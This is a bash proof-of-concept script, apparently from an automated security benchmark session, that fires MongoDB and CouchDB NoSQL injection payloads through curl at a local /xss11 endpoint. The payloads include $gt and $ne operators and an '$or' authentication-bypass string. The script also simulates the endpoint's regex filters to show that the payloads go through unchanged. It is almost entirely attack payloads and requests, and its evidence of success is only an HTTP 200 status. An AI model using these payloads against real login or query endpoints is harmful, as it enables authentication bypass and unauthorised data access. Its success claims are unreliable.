#!/bin/bash
# POC: Demonstrates NoSQL injection payloads bypassing the inadequate regex validation on /xss11 endpoint
# Target: ./repo
# Created: 2025-11-05T17:14:32.552Z
# Session: benchmark-XBEN-012-24-mhm7ivyh

# NoSQL Injection Bypass POC for /xss11 endpoint
# Demonstrates that NoSQL injection payloads bypass the inadequate regex validation

TARGET_URL="${1:-http://localhost:5000/xss11}"

echo "=========================================="
echo "NoSQL Injection Bypass POC"
echo "=========================================="
echo "Target: $TARGET_URL"
echo ""

# Test Case 1: MongoDB operator injection - {\"$gt\": \"\"}
echo "[TEST 1] MongoDB operator injection: {\"\$gt\": \"\"}"
echo "URL: $TARGET_URL?name={\"\$gt\": \"\"}"
RESPONSE=$(curl -s "$TARGET_URL?name={\"\\$gt\": \"\"}" -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status: $HTTP_CODE"
if [[ "$HTTP_CODE" == "200" ]]; then
    echo "✓ PAYLOAD PASSED THROUGH (not filtered)"
else
    echo "✗ Payload blocked or error"
fi
echo ""

# Test Case 2: MongoDB operator injection - {\"$ne\": null}
echo "[TEST 2] MongoDB operator injection: {\"\$ne\": null}"
echo "URL: $TARGET_URL?name={\"\$ne\": null}"
RESPONSE=$(curl -s "$TARGET_URL?name={\"\\$ne\": null}" -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status: $HTTP_CODE"
if [[ "$HTTP_CODE" == "200" ]]; then
    echo "✓ PAYLOAD PASSED THROUGH (not filtered)"
else
    echo "✗ Payload blocked or error"
fi
echo ""

# Test Case 3: CouchDB selector injection
echo "[TEST 3] CouchDB selector injection: {\"_id\": {\"\$gt\": null}}"
echo "URL: $TARGET_URL?name={\"_id\": {\"\$gt\": null}}"
RESPONSE=$(curl -s "$TARGET_URL?name={\"_id\": {\"\\$gt\": null}}" -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status: $HTTP_CODE"
if [[ "$HTTP_CODE" == "200" ]]; then
    echo "✓ PAYLOAD PASSED THROUGH (not filtered)"
else
    echo "✗ Payload blocked or error"
fi
echo ""

# Test Case 4: MongoDB authentication bypass pattern
echo "[TEST 4] MongoDB authentication bypass: admin\", \"\\\$or\": [{\"x\": {\"\$gt\": \"\"}}], \"//\": \""
PAYLOAD="admin\", \"\\\$or\": [{\"x\": {\"\$gt\": \"\"}}], \"//\": \""
echo "URL: $TARGET_URL?name=$PAYLOAD"
RESPONSE=$(curl -s "$TARGET_URL?name=$PAYLOAD" -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status: $HTTP_CODE"
if [[ "$HTTP_CODE" == "200" ]]; then
    echo "✓ PAYLOAD PASSED THROUGH (not filtered)"
else
    echo "✗ Payload blocked or error"
fi
echo ""

# Test Case 5: Verify regex filters don't detect NoSQL operators
echo "[TEST 5] Verify regex filter inadequacy - checking filter logic"
echo "Testing if \$gt, \$ne, \$or operators pass through filters..."
echo ""

# Simulate the regex filters from the application
test_payload() {
    local payload=$1
    local name=$2
    
    # Filter 1: Remove "XSS" in quotes
    filtered=$(echo "$payload" | sed 's/[\"'"'"']XSS[\"'"'"']//g')
    
    # Filter 2: Remove HTML tags with lowercase
    filtered=$(echo "$filtered" | sed 's/<[a-z\/]//g')
    
    if [ "$filtered" = "$payload" ]; then
        echo "  ✓ '$name' - BYPASSES FILTERS (payload unchanged)"
        return 0
    else
        echo "  ✗ '$name' - FILTERED"
        return 1
    fi
}

echo "Payload filter bypass results:"
test_payload '{"$gt": ""}' "MongoDB \$gt operator"
test_payload '{"$ne": null}' "MongoDB \$ne operator"
test_payload 'admin", "$or": [{"password": {"$gt": ""}}], "//": "' "Auth bypass pattern"
test_payload '{"$and": [{"user": "admin"}]}' "MongoDB \$and operator"

echo ""
echo "=========================================="
echo "Summary: NoSQL injection operators bypass"
echo "the inadequate XSS-focused regex filters"
echo "=========================================="